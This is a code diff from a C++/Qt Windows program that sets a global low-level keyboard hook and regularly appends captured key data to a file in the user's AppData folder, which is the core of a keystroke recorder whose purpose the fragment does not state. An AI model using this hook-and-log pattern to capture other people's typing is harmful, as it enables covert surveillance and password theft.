@@ -9,13 +9,27 @@ Core::Core(QObject *parent) :
 {
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);
 
-    QTimer *timer = new QTimer();
-    QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
-    timer->start(9000);
-
     if (hHook == nullptr) {
         QCoreApplication::exit(1);
     }
+
+    QString outputDirPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
+    QDir outputDir = QDir(outputDirPath);
+
+    if (!outputDir.exists()) {
+        outputDir.mkdir(outputDir.absolutePath());
+    }
+
+    QString outputPath = outputDir.absolutePath() + QDir::separator() + QString(OUTPUT_NAME);
+    output.setFileName(outputPath);
+
+    if (!output.open(QFile::Append | QFile::Text)) {
+        QCoreApplication::exit(1);
+    }
+
+    QTimer *timer = new QTimer();
+    QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
+    timer->start(9000);
 }
 
 void Core::update(BYTE *keyState, int keyCode)
